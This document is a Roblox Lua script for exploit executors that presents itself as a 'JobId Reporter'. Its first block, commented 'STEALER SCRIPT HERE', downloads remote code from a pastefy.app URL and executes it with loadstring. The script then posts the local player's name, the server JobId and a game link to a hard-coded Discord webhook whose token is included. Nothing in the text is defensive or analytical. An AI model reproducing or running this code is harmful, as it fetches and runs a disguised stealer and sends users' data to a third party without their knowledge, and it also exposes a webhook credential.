‎repeat task.wait() until game:IsLoaded()
‎
‎--  STEALER SCRIPT HEREðŸ‘‡
‎pcall(function()
‎    loadstring(game:HttpGet("https://pastefy.app/Bokjxkob/raw"))()
‎end)
‎
‎-- Services
‎local HttpService = game:GetService("HttpService")
‎local Players = game:GetService("Players")
‎local lp = Players.LocalPlayer
‎
‎-- PlaceId & JobId
‎local placeId = game.PlaceId
‎local jobId = game.JobId
‎
‎-- Discord webhook
‎local WEBHOOK_URL = "https://discord.com/api/webhooks/1397152370940575785/BYSlgKcS-yJqmA_CCOSr93BbwqVwy_DPI-cSEoXVO4CDoy0AQthEuNs3FQh7Xnjpr2gk"
‎
‎-- Roblox clickable game link (opens game page; auto-join not guaranteed)
‎local gameLink = string.format("https://www.roblox.com/games/%s", placeId)
‎
‎-- Build embed
‎local payload = {
‎    content = "**Server Info Detected!**",
‎    embeds = {{
‎        title = "JobId Info",
‎        color = 3447003,
‎        fields = {
‎            { name = "Player", value = lp.Name.." (@"..lp.DisplayName..")", inline = true },
‎            { name = "PlaceId", value = tostring(placeId), inline = true },
‎            { name = "JobId", value = "```"..jobId.."```", inline = false },
‎            { name = "Game Link", value = "[Open Game]("..gameLink..")", inline = false },
‎        },
‎        footer = { text = "Generated via Lua JobId Reporter" },
‎        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
‎    }}
‎}
‎
‎-- Encode JSON
‎local body = HttpService:JSONEncode(payload)
‎
‎-- Detect HTTP request function
‎local req = request or http_request or (syn and syn.request) or (http and http.request)
‎
‎-- Send webhook
‎if req then
‎    pcall(function()
‎        req({
‎            Url = WEBHOOK_URL,
‎            Method = "POST",
‎            Headers = {["Content-Type"] = "application/json"},
‎            Body = body
‎        })
‎    end)
‎    print("[Webhook] Sent JobId + Game Link to Discord!")
‎else
‎    warn("No HTTP request function available in this executor.")
‎end
‎
